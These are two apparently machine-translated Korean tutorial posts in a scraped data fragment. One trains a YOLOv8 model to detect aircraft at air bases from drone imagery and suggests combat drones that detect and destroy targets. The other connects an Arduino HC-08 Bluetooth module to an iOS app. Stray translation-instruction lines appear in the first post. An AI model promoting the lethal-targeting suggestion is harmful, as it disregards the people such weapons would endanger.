Detection in Military Operations - Image 1](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_1.png)\n\n위의 그림에서 보는 것처럼 프로젝트를 위한 적합한 DataSet를 찾아야 합니다. 이 예시에서는 모델 유형으로 yolov8를 선택했고, 프로젝트 유형으로 객체 감지를 선택하고, 검색어로 공중을 입력했습니다. 시스템은 다양한 데이터 세트 목록을 제공하며, 이미지 수가 1192개이고 클래스가 1개인 것을 고려하여 우리의 요구에 더 잘 맞는 하나를 선택했습니다.\n\n![DIY for a Spy: Utilizing YOLOv8 Object Detection in Military Operations - Image 2](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_2.png)\n\n데이터 세트가 미션에 적합하다고 판단했다면, 적절한 내보내기 형식을 선택하여 다운로드해야 합니다. 우리의 시나리오에서는 이미 사용하기로 한 YOLOv8 형식을 선택했습니다.\n\n\n\n\n아래의 표를 Markdown 형식으로 변경하세요.\n\n\n\n위의 그림에서 볼 수 있듯이, 저는 프로젝트 이름 AER_AIR_04s, 항공 기지에서 항공기 감지하는 짧은 설명, 심지어 샘플 이미지까지 입력했습니다. 다른 프로젝트들 중에서도 이 프로젝트를 쉽게 식별할 수 있도록 도와주죠. \n\n다음 단계로 진행할 때는 '데이터 세트'로 이동하셔서 다음과 같이 Detect 데이터 세트 유형, 데이터 세트 이름, 그리고 설명을 선택해야 합니다.\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_5.png)\n\n\n\n'Create' 버튼을 클릭한 후 파일 업로드가 완료되면 데이터 세트 목록 중에 새로운 데이터 세트가 표시됩니다.\n\n![image1](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_6.png)\n\n그냥 들어가서 이미지와 라벨을 확인하고 '모델 훈련' 버튼을 눌러 YOLOv8 모델 훈련을 계속하세요.\n\n![image2](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_7.png)\n\n\n\n다음 창에서는 목록에서 프로젝트를 선택하고, 예제에서 나온 모델명 YOLOv8sAir을 입력하고, 속도 최적화된 YOLOv8 아키텍처 YOLOv8를 선택한 후 '계속' 버튼을 클릭해야 합니다.\n\n![이미지](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_8.png)\n\nUltralytics Hub에는 모델을 훈련하는 데 사용할 수 있는 다양한 옵션이 있지만, 우리는 다음을 활용할 것입니다 - 'Google Colab'.\n\n![이미지](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_9.png)\n\n\n\n위의 그림과 같이 모델 훈련을 위한 인증 키와 URL(https://hub.ultralytics.com/models/BN8V8tA1pOt6thjZKq6V)이 제공됩니다.\n\n그냥 전체 코드를 복사해서 Google Colab에 붙여넣기하세요.\n\n```js\nhub.login('[YOUR_AUTH_KEY]')\n\nmodel = YOLO('https://hub.ultralytics.com/models/BN8V8tA1pOt6thjZKq6V')\nresults = model.train()\n```\n\n그런 다음 '런타임' 메뉴로 이동하여 '런타임 유형 변경'을 선택하고 'T4 GPU'를 선택하여 NVIDIA T4 GPU 가속기로 훈련을 가속화하세요.\n\n\n\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_10.png)\n\n\n번역:\n이미지 태그를 Markdown 형식으로 변경해주세요.\n\n작업이 완료되었으면, Google Colab 스크립트에서 일반적으로 하는 것처럼 YOLOv8 모델 훈련 프로세스를 시작할 수 있습니다.\n\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_11.png)\n\n\n해당 큰 데이터 세트에 대한 훈련 프로세스는 대략 3-4시간이 소요될 것입니다. 그러나 진행 상황은 Google Colab 목록에서만 확인하는 것이 적합하지 않을 수 있기 때문에 YOLOv8 모델 웹페이지의 특별 진행률 표시줄을 사용하여 모니터링할 수 있습니다.\n\n\n\n\u003cimg src=\"/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_12.png\" /\u003e\n\n이미 이전에 말씀드렸듯이, 시간이 걸릴 수 있습니다. 완료되면 '배포' 탭으로 이동하여 최종 모델 (*.pt) 파일을 다운로드하세요. 이 모델을 활용하여 라즈베리 파이를 비롯한 모든 기기에서 YOLOv8 패키지를 사용하여 물체를 감지할 수 있습니다. 공군기지나 전술에서 또는 요청된 작전을 위해 정찰 드론에서 공중 또는 지면의 물체를 인지할 수 있습니다.\n\n## YOLOv8 사용법\n\n이 시점에서 이미 원하는 PyTorch (*.pt) 파일과 YOLOv8 모델의 가중치를 갖고 있는 상태입니다. 이 파일은 예시에서 21.4MB 크기입니다. 몇 줄의 코드만 추가하면 어떤 애플리케이션에서도 사용할 수 있게 됩니다.\n\n\n\n편의를 위해 PT 파일과 실험 중에 사용할 이미지 및 비디오 소스를 지속적인 블록체인 저장소 Arweave에 업로드했습니다. 이 세 개의 파일을 다운로드하여 Google Compute Engine의 작업 디렉토리에 저장하려면 다음 코드를 작성하고 실행해야 합니다.\n\n```js\nyolov8sair_url = 'https://6bq43uyscbhniu4kvl6hayy3zosqjnl5x2v2jm7zlfse6nnqrqsa.arweave.net/8GHN0xIQTtRTiqr8cGMby6UEtX2-q6Sz-VlkTzWwjCQ'\nurllib.request.urlretrieve(yolov8sair_url, 'yolov8sair.pt')\n\nsource_file = 'https://6x77tjsjpqn6ze2k7izx36xgtipzff6yi2jfnp2xxf6lvmtyy7oa.arweave.net/9f_5pkl8G-yTSvozffrmmh-Sl9hGkla_V7l8urJ4x9w'\nurllib.request.urlretrieve(source_file, 'Aerial_AirBase.jpg')\n\nsource_video = 'https://3tghzdwlhmyajv5eadufzesdo7epc5queknepym6hv2p737mgvxa.arweave.net/3Mx8jss7MATXpADoXJJDd8jxdhQimkfhnj10_-_sNW4'\nurllib.request.urlretrieve(source_video, 'airport_video_source.mp4')\n```\n\n세 개의 파일이 있음을 알아차릴 수 있을 것입니다: yolov8sair.pt는 모델 가중치 파일, Aerial_AirBase.jpg는 정찰 드론에서 가져온 예제 이미지로 객체 감지에 사용될 것이며, airport_video_source.mp4는 추후 객체 인식을 위해 사용할 비디오 소스의 예제입니다.\n\n```js\nmodel = YOLO('yolov8sair.pt')\n\nresults = model.predict('Aerial_AirBase.jpg')\nannotated_frame = results[0].plot()\ncv2_imshow(annotated_frame)\n```\n\n\n\n위에 표시된 이미지에서, 다양한 확률로 각각 약 84% 정도의 신뢰 수준을 나타내며, 세 대의 비행기가 감지되었습니다. 이와 같은 상황에서는 결과[] 배열의 객체 목록을 자동으로 계산하여 손쉽게 수를 세어볼 수 있습니다.\n\n신뢰도와 확률 수준은 날씨 조건에 따라 다를 수 있습니다. 그러나 구리게 날씨 같은 명시적 단점에도 불구하고, 이 정찰 방법은 군사 작전을 계획하고 전투 활동을 지원하는 데 중요하다는 것이 증명되었습니다.\n\n\n\n방금 보신 것처럼 몇 줄의 코드만으로 사용하기 쉬운 것이 이 기술의 장점입니다. 이를 활용하여 소형 비행 컨트롤러를 갖춘 자율 비행 드론을 포함한 다양한 애플리케이션에 적용할 수 있습니다.\n\n이 객체 감지 메커니즘을 통합하여 만들 수 있는 스마트 애플리케이션을 상상해보세요. 비행 경로를 추적하고 목표물을 감지하여 파괴하는 자동 비행기와 같은 전투 드론을 생각해보세요. 상상력을 발휘해 보세요.\n\n군사 솔루션에 활용할 수 있는 또 다른 좋은 예시인데요:\n\n```js\nmodel = YOLO('yolov8sair.pt')\n\n# 비디오 스트림 내 객체 감지\ncap = cv2.VideoCapture(f\"airport_video_source.mp4\")\nimg_array = []\n\nwhile cap.isOpened():\n    success, frame = cap.read()\n\n    if success:\n        results = model(frame)\n        annotated_frame = results[0].plot()\n        img_array.append(annotated_frame)\n    else:\n        break\n\ncap.release()\n\n# 출력 비디오 파일로 저장\nsize = img_array[0].shape[1], img_array[0].shape[0]  # (384, 640)\nwriter = cv2.VideoWriter(f\"airport_video_output.mp4\", cv2.VideoWriter_fourcc(*\"mp4v\"), 25, size)\nfor frame in img_array:\n    img_n = cv2.resize(frame, size)\n    writer.write(img_n)\nwriter.release()\n```\n\n\n\n이 문제는 비디오 스트림에서 Object Detection이 포함되어 있으며, 여기서는 airport_video_source.mp4 파일에서 추출됩니다. 그런 다음 비디오를 프레임으로 나누어 각 프레임에서 항공기를 감지하고 이를 airport_video_output.mp4 파일로 편집합니다.\n\nGoogle Compute Engine의 작업 디렉토리에서이 파일을 다운로드 할 수 있습니다. 이미 이에 익숙한 것으로 알고 있습니다.\n\n![이미지](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_14.png)\n\n위의 비디오 파일을 확인해보세요. 비행기 대부분이 감지되었지만 일부는 인식되지 않았습니다. 모델의 정확도를 향상시킬 방법에 대해 고려하고, 의견을 공유하려면 아래의 댓글란을 이용해 주세요.\n\n\n\n## X-Files\n\n이 기사에서 시연 목적으로 사용한 YOLOv8 Object Detection의 모든 파일 목록은 아래에 나와 있습니다.\n\nPyTorch 모델: YOLOv8sAir\n\n드론 소스:\n\n\n\n- 정적 이미지: Aerial_AirBase.jpg\n- 공항 동영상: AirBase_Video.mp4\n\n소스 코드: 구글 연구 Colab\n\n당신의 상상력을 발휘하여 놀라운 솔루션을 만들어보세요!\n\n## 연락처\n\n\n\n이 기사에서 설명된 내용 또는 다른 아이디어에 대해 궁금한 점이 있으면 — 트위터에서 언제든지 저에게 질문해주세요.\n\n트위터: https://twitter.com/dmytro_sazonov\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_15.png)","ogImage":{"url":"/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png"},"coverImage":"/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png","tag":["Tech"],"readingTime":8},{"title":"아두이노와 iOS 간의 블루투스 연결","description":"","date":"2024-05-15 04:34","slug":"2024-05-15-BluetoothconnectionbetweenArduinoandiOS","content":"\n\n# 소개\n\n안녕하세요!! 여기에 오신 것을 환영합니다. 아두이노 장치에서 iOS 장치로 블루투스를 사용하여 데이터를 송수신하는 방법을 찾고 계시다고 생각합니다, 맞나요? (빌드할 내용을 설명하는 비디오가 있는 GitHub 링크를 여기에 배치했습니다).\n\n이를 위해 지식을 두 부분으로 나누기로 결정했습니다. 첫 번째 부분에서는 하드웨어 구체적인 내용, 블루투스 모듈의 조립 및 아두이노 코드를 통해 정보를 전송하는 방법에 대해 다룰 것입니다. 이 문서의 후반부에서는 iOS 개발에 대해 다룰 예정입니다.\n\n# 블루투스 모듈\n\n\n\n이 프로젝트에서는 에너지 소비가 적은 통신 형태인 블루투스를 아두이노와 IOS 장치 간에 사용하기로 결정했습니다. 이것은 배터리로 아두이노를 사용할 때 중요한 요소입니다.\n이를 염두에 두고 프로젝트를 시작할 때의 첫 번째 질문은 아두이노에 이미 블루투스가 내장되어 있는지 여부입니다(이를 위해 문서에 접근할 수 있음). 저의 경우, 블루투스가 내장되어 있지 않은 ArduinoUno를 사용할 예정이므로 이 기술을 제공하는 모듈이 필요합니다.\n\n어떤 모듈을 사용해야 할까요?\niOS 기기는 BLE(Bluetooth Low Energy)라는 기술을 사용하여 통신하며, 일반적인 블루투스와 차이가 있지만, 이는 다른 기사로 남기겠습니다. 따라서 BLE를 지원하는 모듈이 필요하며, 여러 옵션이 있습니다(구매하기 전에 주의하세요), 하지만 저는 HC-08 모듈을 사용할 예정입니다.\n\n![Image](/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png)\n\n# Arduino에 HC-08 연결하기\n\n\n\n조립을 더 잘 설명하기 위해 어셈블리를 시연하기 위한 다이어그램을 만들었습니다.\n\n![Bluetooth Connection Diagram](/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_1.png)\n\n프로젝트에서 핀 2와 3을 이미 사용 중이라면, TX 및 RX를 사용 가능한 핀에 연결할 수 있습니다(이 경우 SoftwareSerial을 사용합니다). 그러나 코드에 도달하면 사용 중인 핀을 변경해야 합니다.\n이미지에 문제가 있을 경우, HC-08에서 아두이노로 연결되는 방법을 적어놓겠습니다:\n\n- VCC → 5V\n- GND → GND\n- TXD(송신) → 2\n- RXD(수신) → 3\n\n\n\n# 코딩 시간\n\n우리가 아두이노에 업로드할 코드는 블루투스 모듈(나의 iOS 기기에 연결될 것)로 정보를 보내고, 그 모듈은 나의 iOS 기기로 데이터를 전송할 것을 목적으로 합니다.\n\n```js\n#include \"SoftwareSerial.h\"\nSoftwareSerial bluetooth(3, 2); //3 = RX ; 2 = TX\n```\n\n기본적으로, 코드의 이 부분에서는 SoftwareSerial 라이브러리를 사용하고 있습니다. 이 라이브러리를 사용하면 아두이노 디지털 핀에 추가적인 시리얼 포트를 생성할 수 있습니다. 이 기능은 시리얼 통신이 필요하지만 이미 주 시리얼 포트를 코드를 디버깅하기 위한 시리얼 모니터로 사용하는 경우와 같이 주 시리얼 포트가 다른 목적으로 이미 사용 중인 경우 유용합니다.\n\n\n\n소프트웨어 시리얼 인스턴스가 이름이 \"bluetooth\"인 것을 만들었습니다. 매개변수 (3, 2)는 아두이노의 핀 3을 RX(수신)로, 핀 2를 TX(송신)로 사용할 것을 나타냅니다 (기본적으로 첫 번째 숫자가 RX이며 두 번째 숫자가 TX입니다).\n\n⚠️만약 다른 핀을 사용했다면, 숫자를 변경하세요.⚠️\n\n```js\nvoid setup() {\n  Serial.begin(9600);\n  bluetooth.begin(9600);\n}\n```\n\n설정 함수에서(스크립트가 실행될 때에만 실행되는 함수), 아두이노와 컴퓨터 사이에 표준 시리얼 포트를 통해 초당 9600비트의 속도로 시리얼 통신을 시작합니다 (디버깅에 유용합니다).\n\n\n\n이제 \"블루투스\"라고 불리는 객체의 직렬 통신을 9600 비트로 설정하여 시작합니다. 이는 아두이노와 핀 2와 3에 연결된 블루투스 모듈 간의 통신을 수립합니다.\n\n```js\nvoid loop() {\n    bluetooth.print(\"성공!\"); \n    delay(2000);\n    bluetooth.print(\"잘 했어요!\");\n    delay(2000);\n}\n```\n\n이제 우리의 루프에서는 코드가 계속해서 실행되며, 기본적으로 블루투스 모듈과 통신하도록 한 책임자에게 문자열을 보내고 있습니다. 매 2초마다 다른 문자열을 보내고 있습니다.\n\n이 코드 스니펫의 아이디어는 여러분의 프로젝트에 맞는 데이터를 가져와 생성된 통신으로 보내는 것입니다. 이 경우 문자열만 보내고 있지만 다양한 유형의 데이터를 보낼 수 있습니다.\n\n\n\n# iOS 프로젝트\n\n지금까지 배운 것으로는, 코드와 아두이노가 준비가 되어 블루투스 장치와 연결하고 정보를 전송할 수 있게 되었어요. 이제는 SwiftUI iOS 프로젝트를 만들어야 할 때입니다.\n\n# XCode 권한\n\nXCode에서 프로젝트를 생성한 후, \"info.plist\"에 블루투스 사용을 추가해야 합니다. 그러면 애플리케이션이 사용자에게 다른 블루투스 장치에 연결할 권한을 요청할 수 있어요.\n\n\n\n프로젝트 파일에 액세스하고 \"info\" 탭에 들어가야 해요. 그 화면에 들어가면 기존 항목 위에 마우스 포인터를 두고 \"＋\"를 클릭해서 \"Privacy — Bluetooth Peripheral Usage Description\"을 추가해야 해요.\n\n우리가 추가할 이 권한은 사용자에게 Bluetooth 장치에 연결할 권한을 요청하는 것이에요. \"value\"는 연결을 요청하는 메시지로 사용자에게 표시될 거에요.\n\n그런데 다른 권한인 \"Privacy — Bluetooth always usage Description\"도 있어요. 이 권한은 앱이 종료되어도 계속 Bluetooth을 사용하도록 사용자에게 요청하는데, 우리가 여기서 제안한 프로젝트에는 필요 없는 권한이에요.\n\n권한을 추가한 후에는 우리의 \"info\" 목록에 새로운 줄이 이렇게 보여야 해요:\n\n\n\n# Swift 코딩\n\n이제 Arduino를 준비하고 Bluetooth를 사용하기 위한 필수 권한을 설정했으니, 코드 작성을 시작할 수 있습니다.\n\n이 맥락에서, 이 기사에서 \"BluetoothController\"라고 부르는 부분만 설명하겠습니다. 이 컨트롤러에서 수집된 정보와 데이터를 표시하는 뷰는 GitHub에서 액세스할 수 있지만, 기본적으로 컨트롤러에서 수집된 정보와 데이터를 표시합니다.\n\n이 매체 기사의 이 부분에서 설명하고자 하는 섹션을 넣은 다음, 더 작은 섹션으로 나누어 각각 설명하겠습니다. 세 개의 점을 통과할 때마다, 새로운 섹션을 설명하기 시작함을 나타냅니다.\n\n\n\n이렇게 할 것입니다:\n\n```js\nimport Foundation\nimport CoreBluetooth\nclass BluetoothController: NSObject, ObservableObject, CBPeripheralDelegate {\n    \n    private var centralManager: CBCentralManager!\n    \n    @Published var connectedPeripheral: CBPeripheral?\n    @Published var discoveredPeripherals = [CBPeripheral]()\n    @Published var isConnected = false\n    @Published var bluetoothStatus: BluetoothStatus = .off\n    @Published var valueReceived: String?\n   \n    override init() {\n        super.init()\n        centralManager = CBCentralManager(delegate: self, queue: nil)\n        centralManagerDidUpdateState(centralManager)\n    }\n}\n```\n\n\"BluetoothController\"은 뷰에서 정보에 액세스할 것이므로 observable해야 하고, ObjectiveC stuff를 사용할 예정이므로 NSObject여야 하며, 연결될 블루투스 장치(페리페럴)로부터 이벤트를 처리할 수 있는 메서드를 정의하는 CoreBluetooth가 제공하는 프로토콜인 CBPeripheralDelegate를 준수해야 합니다.\n\n```js\nprivate var centralManager: CBCentralManager!\n```\n\n\n\n우리는 CBCentralManager 타입의 centralManager 변수를 생성했습니다. 이는 CoreBluetooth에서 제공하는 타입으로, BLE 통신에서 중심 역할을 하는 Bluetooth \"페리페랄\"과 통신 관리를 담당합니다.\n\n```js\n@Published var connectedPeripheral: CBPeripheral?\n@Published var discoveredPeripherals = [CBPeripheral]()\n@Published var isConnected = false\n@Published var bluetoothStatus: BluetoothStatus = .off\n@Published var valueReceived: String?\n```\n\n생성된 이 변수들은 화면에 표시할 정보입니다.\n\n```js\noverride init() {\n        super.init()\n        centralManager = CBCentralManager(delegate: self, queue: nil)\n        centralManagerDidUpdateState(centralManager)\n}\n```\n\n\n\n마지막으로, init을 사용하여 우리의 슈퍼클래스인 NSObject을 초기화하는 init 메서드가 있습니다. 여기서 모든 BluetoothController의 추가 설정을 제공하기 전에 NSObject에서 제공하는 모든 것을 초기화합니다.\n\ncentralManager = CBCentralManager(delegate: self, queue: nil) - 이 줄은 Bluetooth 통신을 위한 \"중앙 매니저\"인 CBCentralManager의 인스턴스를 초기화합니다. 중앙 매니저의 \"delegate\"를 self로 설정하여 BluetoothController 인스턴스가 Bluetooth 이벤트에 관련된 반환을 받게 됩니다. 상태 변경, 페리페럴 발견 등과 관련된 반환에 대한 delegate로서 센트럴 매니저가 메인 디스패치 큐를 사용할 것을 나타내는 queue 매개변수는 nil로 설정되어 있습니다.\n\ncentralManagerDidUpdateState(centralManager) - 이 줄은 BluetoothController의 centralManagerDidUpdateState 메서드를 직접 호출합니다. 이 메서드는 CBCentralManagerDelegate 프로토콜의 일부이며 Bluetooth 상태가 변경될 때 호출됩니다. 센트럴 매니저를 초기화한 후 이 메서드를 직접 호출함으로써 BluetoothController 인스턴스가 초기화 직후 현재 Bluetooth 상태를 처리할 수 있도록 보장됩니다.\n\n```js\nextension BluetoothController: CBCentralManagerDelegate {\n    \n    func centralManagerDidUpdateState(_ central: CBCentralManager) {\n        switch central.state {\n        case .poweredOn:\n            centralManager.scanForPeripherals(withServices: nil, options: nil)\n            bluetoothStatus = BluetoothStatus.on\n            \n        case .poweredOff:\n            self.connectedPeripheral = nil\n            self.discoveredPeripherals = []\n            self.isConnected = false\n            self.valueReceived = nil\n            bluetoothStatus = BluetoothStatus.off\n            \n        case .resetting:\n            // Wait for next state update and consider logging interruption of Bluetooth service\n            bluetoothStatus = BluetoothStatus.resetting\n            \n        case .unauthorized:\n            // Alert user to enable Bluetooth permission in app Settings\n            bluetoothStatus = BluetoothStatus.unathorized\n            \n        case .unsupported:\n            // Alert user their device does not support Bluetooth and app will not work as expected\n            bluetoothStatus = BluetoothStatus.unsupported\n            \n        case .unknown:\n            // Wait for next state update\n            bluetoothStatus = BluetoothStatus.unknown\n            \n        @unknown default:\n            print(\"---Default case---\")\n        }\n    }\n```\n\n\n\n\"centralManagerDidUpdateState\" 메서드 내에서 중앙 매니저의 현재 상태에 따라 다양한 조치가 취해집니다:\n\n- .poweredOn: Bluetooth가 켜져 있으면 중앙 매니저가 블루투스 장치를 스캔하기 시작합니다\n- .poweredOff: Bluetooth가 꺼져 있으면, 이미 발견되거나 연결된 장치에 대한 모든 참조를 지우고 Bluetooth를 다시 켤 때 모두 다시 발견해야 합니다.\n\n각 상태마다 적절한 처리를 해야 하며, 이 경우에는 블루투스 상태를 현재 상태로 설정하고 이러한 경우를 처리한 것이 아니라는 점을 유의하십시오. 그러나 각 상태가 의미하는 바는 문서에서 찾을 수 있습니다.\n\n본 코드는 본질적으로 Bluetooth 상태 변화를 모니터하고 이에 적절하게 대응하여 애플리케이션이 이러한 변화에 적절하게 반응하도록 보장합니다.\"\n\n\n\n```swift\nfunc centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral, advertisementData: [String : Any], rssi RSSI: NSNumber) {\n    if !peripheralAlreadyRegistered(peripheral: peripheral){\n        discoveredPeripherals.append(peripheral)\n    }\n}\n\nfunc peripheralAlreadyRegistered(peripheral: CBPeripheral) -\u003e Bool{\n    return discoveredPeripherals.contains(peripheral)\n}\n```\n\n이제 CentralManager가 감지하는 이벤트에 따라 자동으로 호출되는 일련의 메소드를 입력할 것입니다. 예를 들어, 이전에 블루투스가 켜져 있음을 감지했을 때 \"peripheral\"를 스캔하기 시작했고, 발견하자마자 첫 번째 함수 \"didDiscover\"에 들어갔습니다. 여기에는 발견된 페리페럴과 함께 수행할 작업이 포함되어 있습니다.\n\n이 경우에는 기본적으로 이미 발견되었는지 확인한 후, 아직 발견되지 않은 경우에만 발견된 페리페럴을 발견된 페리페럴 배열에 추가했습니다(뷰에 표시될 배열이며 사용자가 어떤 페리페럴에 연결할지 선택할 수 있도록 표시됩니다).```\n\n\n\n```js\nfunc connect(peripheral: CBPeripheral) {\n    centralManager.connect(peripheral, options: nil)\n}\n\nfunc centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {\n    self.connectedPeripheral = peripheral\n    self.isConnected = true\n\n    peripheral.delegate = self\n    peripheral.discoverServices(nil)\n}\n```\n\n여기에는 뷰에서 선택된 페리페럴에 연결하는 데 책임이 있는 두 가지 함수가 있습니다. 발견된 장치 목록에서 페리페럴을 클릭하면 \"connect\" 함수를 호출하여 중앙 관리자에게 매개변수로 전달된 페리페럴과의 연결을 요청합니다.\n\n연결이 성공하면 Bluetooth 모듈의 LED가 깜박이는 것이 멈추고 켜져 있어야 합니다.\n\n연결이 성공하면 자동으로 CentralManager 함수 \"didConnect\"로 들어가며, 이 경우에:\n\n\n\n\n- 연결된 장치에 대한 참조(connectedPeripheral)를 저장합니다.\n- 연결된 주변 장치의 \"대리자(delegate)\"로서 객체 자체의 정의. 이를 통해 객체는 주변 장치에서 발생하는 이벤트에 대한 알림을 받을 수 있습니다.\n- 연결된 주변 장치로부터 서비스(블루투스 장치가 제공하는 \"기능\"들에 대해 계속 논의됩니다)를 검색을 시작합니다.\n\n```js\nfunc centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {\n    // 오류 처리\n    print(\"주의: 연결 실패\")\n}\n```\n\n다른 함수가 이것을 호출할 수 있는데, 해당 주변 장치에 연결을 시도할 때 연결에 실패했을 때입니다. 이 경우 콘솔에 연결이 실패했다는 메시지를 출력했지만, 이 시나리오를 처리해야 합니다.\n\n```js\nfunc disconnect() {\n    guard let peripheral = connectedPeripheral else {\n        return\n    }\n    centralManager.cancelPeripheralConnection(peripheral)\n}\n\nfunc centralManager(_ central: CBCentralManager, didDisconnectPeripheral peripheral: CBPeripheral, error: Error?) {\n    self.connectedPeripheral = nil\n    self.discoveredPeripherals = []\n    self.isConnected = false\n    self.valueReceived = nil\n        \n    centralManager.scanForPeripherals(withServices: nil, options: nil)\n}\n```\n\n\n\n이제 영구적으로 주변 장치와 연결되어 있지 않도록 연결을 해제하는 기능이 있습니다. 이 기능은 우리가 무엇에 연결돼 있는지 확인한 후, CentralManager에 연결을 취소하도록 요청합니다.\n\n이 연결을 취소하면, 이전에 연결돼 있던 것이 더 이상 연결되지 않았으므로 발견된 장치와 연결된 모든 참조를 지우기로 결정했습니다. 게다가, 주변 기기를 연결하고 30m를 걸어가서 이미 발견한 다른 기기를 잃는 경우도 있을 수 있으므로, 그들의 참조를 삭제하여 더 이상 존재하지 않는 것에 연결하려고 하지 않도록 합니다.\n\n그 후, 다시 주변에 있는 주변 기기를 찾기 시작합니다.\n\n# 서비스\n\n\n\n기본적으로, 서비스는 주변 장치에서 제공되는 기능을 나타내는 특성의 모음입니다. 각 서비스는 하나 이상의 특성을 포함할 수 있으며, 이러한 특성은 주변 장치에서 제공되는 특정 정보를 나타냅니다.\n\n예를 들어, Bluetooth 주변 장치는 \"온도 센서\" 서비스를 가질 수 있으며, 이 서비스에는 센서가 측정한 현재 온도를 제공하는 특성이 포함될 수 있습니다. 또한 \"LED 제어\" 서비스를 가질 수 있으며, 이 서비스에는 LED를 켜거나 끄고 색상을 설정하는 특성이 포함될 수 있습니다.\n\n```js\nfunc peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {\n        guard peripheral.services != nil else {\n            return\n        }\n        discoverCharacteristics(peripheral: peripheral)\n}\n```\n\n장치와의 연결이 끊기거나 연결이 실패할 가능성을 다룬 후, 이전에 서비스를 찾는 함수를 호출한 지점으로 돌아가서, 발견된 서비스가 있을 때 이 함수에 들어가는데, 이것은 이제 CBPeriperalDelegate의 메서드이고 더 이상 CentralManager의 메서드가 아니기 때문에 제 주변 장치에서 발생하는 이벤트는 CBPeripeheralDelegate의 메서드를 통해 처리해야 합니다.\n\n\n\n우리가 서비스 검색 시 호출되는 함수는 기본적으로 해당 장치에 서비스가 있는지 확인하고, 서비스가 있는 경우 해당 서비스의 특성을 찾도록 요청합니다.\n\n```js\nfunc discoverCharacteristics(peripheral: CBPeripheral) {\n    guard let services = peripheral.services else {\n        return\n    }\n    \n    for service in services {\n        peripheral.discoverCharacteristics(nil, for: service)\n    }\n}\n\nfunc peripheral(_ peripheral: CBPeripheral, didDiscoverCharacteristicsFor service: CBService, error: Error?) {\n    guard let characteristics = service.characteristics else {\n        return\n    }\n    \n    for characteristic in characteristics {\n        if characteristic.uuid == CBUUID(string: \"FFE1\") {\n            if characteristic.properties.contains(.notify) {\n                peripheral.setNotifyValue(true, for: characteristic)\n            }\n            \n            self.connectedPeripheral?.readValue(for: characteristic)\n            break\n        }\n    }\n}\n```\n\n첫 번째 함수는 간단히 발견된 모든 서비스에 있는 특성을 검색하도록 요청합니다. 이러한 특성을 찾으면, CBPeripheralDelegate 대리자가 이 이벤트를 식별하고 \"didDiscoverCharacteristics\" 메서드를 호출합니다.\n\n이 메서드에서는 특성 목록이 null이 아닌지 확인하고, 그 후에 찾은 모든 특성을 특성 식별자가 \"FFE1\"인 특성을 찾아냅니다. 이는 우리가 원하는 값을 제공하는 특성이며 값이 변경될 때 경고해주는 notify 속성을 가지고 있습니다.\n\n\n\n그 후에 이 속성에 포함된 값이 무엇인지를 읽습니다.\n\n# 주의\n\nHC-08 모듈을 사용하는 이 프로젝트의 경우, 찾고 있는 ID는 \"FFE1\"입니다. 그러나 다른 모듈을 사용 중이라면 ID가 다를 수도 있습니다.\n\n찾아야 할 기능이 무엇인지 알아보려면 모듈 또는 아두이노의 데이터 시트를 읽는 것을 추천합니다. 또한 \"LightBlue\"라는 앱을 사용하여 장치에 연결하고 장치가 제공하는 서비스에 대한 정보를 포함하여 장치에 대한 몇 가지 정보를 제공할 수 있습니다.\n\n\n\nHC-08 모듈을 사용하는 분들을 위해 gitHub에 데이터 시트를 올려두었어요.\n\n![Bluetooth connection between Arduino and iOS](/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_2.png)\n\n```swift\nfunc peripheral(_ peripheral: CBPeripheral, didUpdateValueFor characteristic: CBCharacteristic, error: Error?) {\n        if let value = characteristic.value {\n            if let stringValue = String(data: value, encoding: .utf8) {\n                valueReceived = stringValue\n            }\n        }\n    }\n```\n\n마지막으로 값을 읽기 위해 요청한 후, 값이 변경되면 \"didUpdateValueFor\" 메서드에 들어가게 되는데, 이 메서드는 받은 값을 문자열로 변환하는 역할을 담당합니다 (이 프로젝트의 목적은 아두이노에서 보내는 두 문자열을 표시하는 것이기 때문이죠).\n\n\n\n그러나 당신의 프로젝트에서는 받고 싶은 데이터 유형으로 변환할 수 있고, 심지어 데이터를 받기 전에 값이 업데이트되길 기다리지 않고도 이 변환을 수행할 수 있습니다. 하지만 이 경우에는 매 두 초마다 문자열을 변경하는 것이 목표였습니다.\n\n# 결론\n\n우리는 다음을 구축했습니다.\n\n- 블루투스 장치와 통신하고 데이터를 수신할 수 있는 클래스;\n- 아두이노에서 블루투스 모듈을 사용하는 방법을 배웠습니다;\n- 아두이노와 iOS가 블루투스를 통해 통신할 수 있도록 만들었습니다.\n\n\n\n저희의 다음 단계로, BluetoothController에서 제공하는 정보에 액세스하여 원하는 뷰에서 사용해야 합니다.\n\n소스 코드는 제 GitHub에서 확인해주세요.\n도움이 되었기를 